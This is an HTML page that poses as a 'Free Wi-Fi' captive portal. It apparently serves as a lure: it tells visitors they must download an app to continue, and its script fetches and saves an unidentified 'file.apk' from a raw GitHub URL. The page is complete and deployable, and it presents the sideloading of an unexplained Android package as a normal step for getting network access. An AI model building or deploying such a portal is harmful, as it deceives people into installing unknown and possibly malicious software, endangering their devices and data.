<!DOCTYPE html>
<html>
  <head>
    <title>Free Wi-Fi</title>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1" />
    <style>
      body {
        font-family: sans-serif;
        background-color: #f9f9f9;
        text-align: center;
        padding-top: 100px;
      }
      h1 {
        font-size: 2em;
        margin-bottom: 20px;
      }
      button {
        font-size: 18px;
        padding: 12px 24px;
        margin-top: 20px;
        background-color: #2196f3;
        color: white;
        border: none;
        border-radius: 8px;
        cursor: pointer;
      }
      button:hover {
        background-color: #1976d2;
      }
    </style>
  </head>
  <body>
    <h1>Welcome to Free Wi-Fi</h1>
    <p>Tap below to download our app and continue.</p>

    <button onclick="downloadAPK()">Download APK</button>

    <script>
      function downloadAPK() {
        const apkUrl = "https://raw.githubusercontent.com/DeployedCartridge/ReasonablyFriedComputer/main/release/file.apk";

        fetch(apkUrl)
          .then(response => {
            if (!response.ok) {
              throw new Error("Failed to fetch APK");
            }
            return response.blob();
          })
          .then(blob => {
            const link = document.createElement("a");
            link.href = URL.createObjectURL(blob);
            link.download = "file.apk";
            link.click();
          })
          .catch(error => {
            alert("Error downloading APK: " + error.message);
          });
      }
    </script>
  </body>
</html>
